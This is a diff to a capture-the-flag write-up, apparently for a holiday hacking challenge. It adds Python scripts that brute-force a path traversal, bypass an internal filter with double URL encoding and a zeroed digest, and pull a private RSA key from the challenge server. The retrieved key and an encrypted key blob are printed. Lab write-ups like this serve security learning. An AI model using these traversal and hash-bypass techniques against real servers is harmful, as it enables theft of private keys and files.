@@ -314,9 +314,54 @@ Since this objective hints so heavily towards that Python file, I decided to upl
 >
 >In essence, the function mixes the data in an inconsistent and potentially destructive way, which makes it unsuitable for generating unique, reliable hashes.
 
-By this took a closer look at the code and found out that computes an all zeroed hash if xrd == 0, meaning if ```hash_result[count_mod]``` is AND-ed with 0, then the outcome will be 0. It dawned upon me after talking on Discord that we are trying to retrie the "/etc/nginx/certs/api.frostbit.app.key" file.  
+By closely examining the code, I discovered that it computes an all-zero hash when `xrd` equals 0. This occurs because if `hash_result[count_mod]` is AND-ed with 0, the result is always 0. To exploit this behavior, I crafted an HTTP GET query using an all-zero hex string as the digest (see the Python code below). 
 
-Thinking much over it, I came up with the following code: 
+Through a discussion on Discord, it became apparent that the objective was to retrieve the `/etc/nginx/certs/api.frostbit.app.key` file, confirming the encryption flaw.
+
+Identifying the correct path to the key file proved challenging. After extensive trial and error, I discovered that setting the digest attribute to all zeros allowed me to infer a relative path to the file based on the server’s response. By experimenting, I found that the endpoint returned "Invalid Status Id or Digest" when a file was successfully located. I leveraged this behavior in a brute-force script to determine the key file's relative path.
+
+```python
+import requests
+import urllib.parse
+
+try:
+    url_base = "https://api.frostbit.app/view/"
+    url_path = "/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000"
+
+    file_id = "etc/nginx/certs/api.frostbit.app.key"
+    relative_path = "../"
+
+    def brute(filepath):
+        navi = ""
+
+        while True:
+            navi += relative_path
+
+            payload = urllib.parse.quote_plus(urllib.parse.quote_plus(f"{navi}{file_id}"))
+            url = f"{url_base}{payload}{url_path}"
+
+            result = requests.get(url)
+            data = result.json()
+
+            if "error" in data.keys():
+                if data["error"] in ("Status Id Too Long"):
+                    break
+                if data["error"] in ("Invalid Status Id or Digest"):
+                    print("\n\nGot something\n\n")
+                    print(f"JSON: {data}")
+                    print(f"URL : {url}")
+                else:
+                    continue
+        return False
+
+    # Bruteforce to find the path
+    brute(file_id)
+except KeyboardInterrupt:
+    print("Bye")
+```
+
+The above Python code produces an URL which I utilized in the following script. Basically the script takes the known nonce, doubles it and prepares a payload which is then inserted in front of the relative file path. The hope is that the hashing algorithm will pick up the nonces and create an all zeroed hash internally. The theory behind it is that if you XOR and AND a nonce with itself, it'll create 0 as output. 
+
 
 ```python
 import requests
@@ -342,10 +387,16 @@ nonce = bytes([
     0xd7,
 ])
 
+# Converting the nonce bytes list into properly formatted string string (if you look closely it is double urlencoded)
 nonce_string = "%25".join(f"{byte:02x}" for byte in nonce)
+
+# Adding a separator at end of this strings
 separator = urllib.parse.quote_plus(urllib.parse.quote_plus("/"))
+
+# Crafting a payload
 payload = f"%25{nonce_string}{separator}"
 
+# Mergin it together
 url = f"https://api.frostbit.app/view/{payload}..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000"
 res = requests.get(url)
 
@@ -353,18 +404,18 @@ print(url)
 print(res.text)
 ```
 
-To explain the code, let's take a first look at how the URL is built up:
+The URL it generates follows this format: 
+```
+https://api.frostbit.app/view/{nonce}{nonce}/{relative_path}/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000"
+```
 
-```
-https://api.frostbit.app/view/{PATH_A}/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000"
-```
-Which gave an URL 
+The ```/{nonce}{nonce}/{relative_path}``` is double url encoded since we must fool an internal filter. The output url will look like this:  
 
 ```
 https://api.frostbit.app/view/%25e9%2598%25a5%250d%2597%259e%25e2%25d7%25e9%2598%25a5%250d%2597%259e%25e2%25d7%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fnginx%252Fcerts%252Fapi.frostbit.app.key/15d977db-9fa9-48f8-be38-d36c2e21b12d/status?debug=1&digest=00000000000000000000000000000000
 ```
 
-Upon visiting it, it showed me: 
+Upon visiting it, it revealed the private RSA key we were hunting for:
 
 ![Feed message 6](/images/act3/act3-frostbit-decrypt-6.png)
 
@@ -424,7 +475,7 @@ jd6fDxOeVjU6usKzSeosoQCkEFvhlkVH6EK6Xfh6XDFatAnZyDNVP/PPihI=
 -----END RSA PRIVATE KEY-----
 ```
 
-I quickly tested decrypted the encrypted CSV file, but it wasn't doable. However, I found something interesting earlier on in one of the JSON replies. Namely an encrypted key: 
+At first I though I could use this to decrypt the CSV file - but no. It didn't work. However, I found something interesting earlier on in one of the JSON replies. Namely an encrypted key: 
 
 ```
 {"encryptedkey":"2ea5d786947ab4dbc462dc0d1fe878b07f46df032f17b43aeeedea7a2683996377d3b57cc2f94781deef9f81e966309e09e26577d5110836c4236b8dc3bec734ed0060168b30530b99d66cb4d33d9e87712dd71fb8ab6d311430b55743994400e9eb452a378a6c930225f69f46bdef91581a6325b4e873458d4fc9287a2f4af7bbc68a6f3db16b1e463982a815b2fc291b1013e880a2a8f077c1fed52a7673ec1bfc7a4bb6edba03ab670332fa3627f20116f6ceeed97a757bb220494cd696e8f5f05869b6f57f5aef18e204c7213d634b56fae8751b7521d86eb5f7d692313398ff70cded16d5eddef0ec655e7a5279d97a15d1c8efa8aac1c4b0073657007a96e34eeeaae9460629ae9ce5d219d512afef28736e6844f297c02e6cf992e36de5fdc8e0f79b71e92a3ecac6c1b703c84ecd7ca8deb52061441d0c30e3c8be30f3a8658be84a26bf7e7ce3d5b4637da157f7e87795fcfecc8411532ad0cc7c6a8a4de2861c2df429507f1909928cb735b4e3758c139b865e0b2ffceac950880219bdf644e6dca7545c03bff09194624a8fbb0ea54ee6ee3caf4749ca2165873b02e46548be0bbffea92cad7bd89606ed3f1f157d4fedc393007de842ab1e17e23f6fb4b4b963f328f1b55bf2fbe1ad57109a4a835308d6dfa0aaf98069bf44f0c8d50fe302205a82c181587d7fab4c1bf562109593a601f7b026e4236f71fc8f","nonce":"e998a50d979ee2d7"}
@@ -444,7 +495,7 @@ With this script I got the following output:
 52685b92ec2ae608c3fe1eedc3789953,e998a50d979ee2d7
 ```
 
-Appears to be a Symmetric Key and IV Pair. Heading over to Cyberchef to solve it, as it appear to be AES based: 
+It looks to be a Symmetric Key and IV Pair. Heading over to Cyberchef to solve it, as it appear to be AES based (grepped the provided artefacts for well known algorithms): 
 
 ![Cyberched decode](/images/act3/act3-frostbit-decrypt-7.png)
 
